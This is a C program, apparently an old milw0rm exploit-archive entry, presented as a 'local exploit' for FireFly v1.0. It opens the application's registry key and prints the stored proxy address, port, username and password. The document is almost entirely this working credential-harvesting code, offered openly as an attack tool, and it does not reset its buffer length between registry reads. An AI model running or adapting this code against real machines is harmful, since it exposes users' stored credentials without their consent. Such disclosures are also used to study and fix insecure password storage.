/*****************************************************************

FireFly v1.0 Local Exploit by Kozan

Application: FireFly v1.0
Vendor: NetCruiser Software - www.netcruiser-software.com
Vulnerable Description: FireFly v1.0 discloses proxy passwords
to local users.

Discovered & Coded by: Kozan
Credits to ATmaCA
Web : www.netmagister.com
Web2: www.spyinstructors.com
Mail: kozan@netmagister.com

*****************************************************************/

#include <stdio.h>
#include <windows.h>

#define BUFSIZE 100
HKEY hKey;
char proxyaddr[BUFSIZE],
        proxyport[BUFSIZE],
        proxyuser[BUFSIZE],
        proxypass[BUFSIZE];
DWORD dwBufLen=BUFSIZE;
LONG lRet;

int main(void)
{

       if(RegOpenKeyEx(HKEY_CURRENT_USER,"Software\\FireFly
FileFinder\\GnutellaServer",
                                       0,
                                       KEY_QUERY_VALUE,
                                       &hKey) == ERROR_SUCCESS)
       {

                       lRet = RegQueryValueEx( hKey, "ProxyAddr", NULL, NULL,(LPBYTE) proxyaddr,&dwBufLen);

                       if( (lRet != ERROR_SUCCESS) || (dwBufLen > BUFSIZE) ){
                                strcpy(proxyaddr,"Not found!");
                       }
           lRet = RegQueryValueEx( hKey, "ProxyPass", NULL, NULL,(LPBYTE) proxypass, &dwBufLen);

                       if( (lRet != ERROR_SUCCESS) || (dwBufLen > BUFSIZE) ){
                                strcpy(proxypass,"Not found!");
                       }
                       lRet = RegQueryValueEx( hKey, "ProxyUser", NULL, NULL,(LPBYTE) proxyuser, &dwBufLen);

                       if( (lRet != ERROR_SUCCESS) || (dwBufLen > BUFSIZE) ){
                                strcpy(proxyuser,"Not found!");
                       }
                       lRet = RegQueryValueEx( hKey, "ProxyPort", NULL, NULL,(LPBYTE) proxyport, &dwBufLen);

                       if( (lRet != ERROR_SUCCESS) || (dwBufLen > BUFSIZE) ){
                                strcpy(proxyport,"Not found!");
                       }

           RegCloseKey( hKey );

                       printf("FireFly v1.0 Local Exploit by Kozan\n");
                       printf("Credits to ATmaCA\n");
                       printf("www.netmagister.com  -  www.spyinstructors.com\n");
                       printf("kozan@netmagister.com\n\n");
                       printf("Proxy Address   : %s\n",proxyaddr);
                       printf("Proxy Port      : %s\n",proxyport);
                       printf("Proxy Username  : %s\n",proxyuser);
                       printf("Proxy Password  : %s\n",proxypass);

        }
        else{
                printf("FireFly v1.0 is not installed on your system!\n");
        }

       return 0;
}

// milw0rm.com [2005-04-07]
